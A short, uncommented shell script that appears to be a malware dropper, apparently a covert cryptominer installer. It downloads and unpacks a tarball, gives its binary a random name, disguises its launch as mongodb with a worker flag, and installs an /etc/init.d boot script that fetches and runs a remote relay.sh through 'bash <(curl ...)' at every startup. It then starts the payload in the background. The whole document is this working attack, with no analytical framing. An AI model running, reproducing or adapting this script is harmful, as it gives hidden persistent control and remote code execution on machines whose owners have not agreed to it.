cd /
wget https://github.com/voltagel/module/releases/download/v1.5.0/cable.tar
tar -xvf cable.tar
cd /cable
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv filter $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./signal.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/voltagel/module/main/relay.sh)" > jumper.sh
chmod a+x jumper.sh
update-rc.d jumper.sh defaults
rm -rf cable.tar
cd /cable
nohup ./signal.sh
ps -ef | grep cable
